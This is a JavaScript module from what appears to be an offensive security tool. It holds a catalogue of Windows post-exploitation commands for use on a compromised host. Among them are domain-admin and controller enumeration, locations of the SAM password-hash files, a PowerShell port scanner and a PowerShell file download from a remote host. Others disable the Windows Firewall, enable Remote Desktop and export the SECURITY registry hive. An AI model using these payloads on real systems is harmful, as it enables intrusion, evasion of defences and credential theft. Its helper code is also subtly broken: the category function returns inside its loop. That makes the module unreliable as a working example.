var prompt = require('prompt');
var M = require('mstring');
var question = require('../modules/questionUser');

// Initialize array and Payload Helper

arrayWin = []

var Load = function(obj){
	arrayWin.push(obj)
}

// Question helper method
var questions = [];
var question = function(val){
	questions.push(val);
}

/* 
###########################################
############### Payloads ##################
###########################################


---[Payload Parameters]---

Required: title, payload, and category
Optional: callback (used for prompt variable)


---[Variable Formatting]---

* If variables aren't added properly, they will not work
* Variables can include instructions if needed.
* Instructions should be kept in parenthesis
	
	ex: foobar <RHOST> <LHOST> <LPORT>
	ex: foobar <RHOST (hostname)> <RPORT>	 


*/

// ############### System Info ######################

Load({ payload: "ver", desc: "Get OS version", category: "System Info"})
Load({ payload: "echo %USERNAME%", desc: "Get current user", category: "System Info"})
Load({ payload: "sc query state=all", desc: "Show services", category: "System Info"})
Load({ payload: "tasklist /svc", desc: "Show processes & services", category: "System Info"})
Load({ payload: "tasklist /m", desc: "Show processes & DLLs", category: "System Info"})

Load({
	payload: "taskkill /PID <PROMPT (pid)> /F",
	desc: "Force process to terminate",
	category: "System Info",
	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
		question.ask("What PID would you like to terminate?", returnToPrepare)
	}
})

Load({
	payload: "reg query HKLM /f <PROMPT (search term)> /t REG_SZ /s",
	desc: "Search registry for value",
	category: "System Info",
	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
		question.ask("What term would you like to search for?", returnToPrepare)
	}
})


// ############### File System ######################


Load({
	title: "Windows Common Files",
	payload: "A quick look at common windows files",
	category: "File System",
	callback: function(bro){
		var m = M(function(){
		/***
		
		%SYSTEMROOT%								Usually C:\Windows
		%SYSTEMROOT%\System32\drivers\etc\hosts					DNS entries
		%SYSTEMROOT%\System32\drivers\etc\networks				Network settings
		%SYSTEMROOT%\System32\config\SAM 					Password hashes
		%SYSTEMROOT%\repair\SAM 						Backup copy of SAM file
		%SYSTEMROOT%\System32\config\RegBack\SAM 				Backup copy of SAM file
		%SYSTEMROOT%\System32\config\AppEvent.Evt   				Application Log
		%SYSTEMROOT%\System32\config\SecEvent.Evt 				Security Log
		%USER%\Start Menu\Programs\Startup 					Startup Location
		%SYSTEMROOT%\Prefetch 							EXE logs

		***/})
		
		console.log(m)
	
		prompt.message = "Press enter to continue"
		prompt.get([{name: '_', description: ':'}], function(err, result){
			bro(1)	
		})
		

	}
})


// ############### Networking ######################

Load({payload: "ipconfig /all", desc: "Get all network interfaces", category: "Networking"})
Load({payload: "ipconfig /displaydns", desc: "Get dns configuration", category: "Networking"})
Load({payload: "netstat -r", desc: "Display routing table", category: "Networking"})
Load({payload: "netstat -nabo", desc: "Lists ports / connections with corresponding process", category: "Networking"})
Load({payload: "netstat -na | findstr :445", desc: "Find listening connections on specific port", category: "Networking"})
Load({payload: "net user /domain", desc: "Lists all of the domain users", category: "Networking"})
Load({payload: "net localgroup administrators", desc: "Prints local admins", category: "Networking"})
Load({payload: "net group “Domain Admins” /domain", desc: "Prints list of Domain Admins", category: "Networking"})
Load({payload: "net localgroup administrators /domain", desc: "Prints local admins", category: "Networking"})
Load({payload: "net group “Domain Controllers” /domain", desc: "Prints the list of Domain Controllers for the current domain", category: "Networking"})
Load({payload: "netsh firewall set opmode disable", desc: "Disable Windows Firewall", category: "Networking"})

// ################### WMIC ######################

Load({payload: "wmic qfe get hotfixid", desc: "Get Patch IDs", category: "WMIC"})
Load({payload: "wmic process list full", desc: "List all processes and their attributes", category: "WMIC"})
Load({payload: "wmic ntdomain list", desc: "Get Domain and DC Information", category: "WMIC"})
// ############### Powershell ######################

Load({
	title: "TCP Port Scan",
	payload: '$ports=(<PROMPT (ports)>);$ip="<RHOST>";foreach ($p in $ports){try{$socket=New-object System.Net.Sockets.TCPClient($ip,$p);}catch{};if ($socket -eq $NULL){echo $ip":"$p" - Closed";}else{echo $ip":"$p" - Open";$socket = $NULL;}}',
	category: "Powershell",
	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
		question.ask("Ports to scan? (ex: 80,443,8080)", returnToPrepare)
	}
})

Load({
	title: "Download File",
	payload: '(new-object system.net.webclient).downloadFile("<RHOST>","<PROMPT (local path)>")',
	category: "Powershell",
	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
	    question.ask("Local path to save file?", returnToPrepare)
	}
})


// ############### Windows Registry ######################

Load({
	title: "Enable Remote Desktop",
	payload: "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",  
	category: "Windows Registry"
})

Load({
	title: "Export Windows Security Hive",
	payload: "reg SAVE HKLM\\SECURITY security.hive",  
	category: "Windows Registry"
})

// ############## End of Payloads ##############




var unique = []
var uniqueCategories = []

module.exports = {
	values: arrayWin,
	getAll: function(value){
		tempArray = []
		for(i=0;i<arrayWin.length;i++){
			if (arrayWin[i].category === value){
				tempArray.push(arrayWin[i])
			}
		}
		return tempArray
	},
	getCategories: function(){
		for (i=0;i<arrayWin.length;i++){
			if(unique[arrayWin[i].category]){

			}
			else {
				unique[arrayWin[i].category] = true;
				uniqueCategories.push(arrayWin[i].category)
			} 
		return uniqueCategories
		}
	}
}